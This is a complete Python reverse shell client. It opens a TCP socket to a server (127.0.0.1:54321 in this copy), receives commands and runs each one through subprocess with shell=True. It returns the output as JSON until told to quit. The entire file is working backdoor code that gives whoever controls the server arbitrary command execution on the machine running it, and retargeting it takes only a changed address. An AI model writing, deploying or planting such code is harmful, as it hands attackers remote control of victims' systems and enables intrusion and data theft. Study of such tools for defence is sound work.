#!/usr/bin/python

import socket
import subprocess
import json

def reliable_send(data):
	# If data is bytes
	if type(data) is bytes:
		# Convert to str
		data = data.decode()

	json_data = json.dumps(data)
	s.send(json_data.encode())

def reliable_recv():
	json_data = ""
	while True:
		try:
			json_data += s.recv(1024).decode()
			return json.loads(json_data)
		except ValueError:
			continue
def init_client():
	global s

	# Create socket
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	# Connect socket
	s.connect(("127.0.0.1", 54321))

	print("Connection Established to Server")

def shell():
	while True:
		# Send/Receive commands
		command = reliable_recv()
		if(command == "q" or command == "exit"):
			print("Connection Closed!")
			break
		else:
			try:
				proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
				result = proc.stdout.read() + proc.stderr.read()
				reliable_send(result)
			except:
				reliable_send("Can't execute that command!")

# Functions call
init_client()
shell()

# Close connection
s.close()
